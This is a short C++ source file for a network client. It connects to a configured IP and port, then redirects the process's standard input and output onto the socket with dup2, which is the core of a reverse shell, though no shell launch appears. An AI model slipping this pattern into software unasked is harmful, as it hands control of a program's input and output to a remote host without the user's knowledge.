#include "client.h"


void CLIENT::Run(){
    m_log = LOG("client.log");

    m_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(m_sock == -1){
        m_log.write("init failed.");
        return;
    }

    m_server.sin_addr.s_addr = inet_addr(m_config.ip().c_str());
    m_server.sin_family = AF_INET;
    m_server.sin_port = htons(m_config.port());

    if( connect(m_sock, (sockaddr*)&m_server, sizeof(m_server)) < 0){
        m_log.write("failed");
        return;
    }
    dup2(m_sock, STDIN_FILENO);
    dup2(m_sock, STDOUT_FILENO);
}
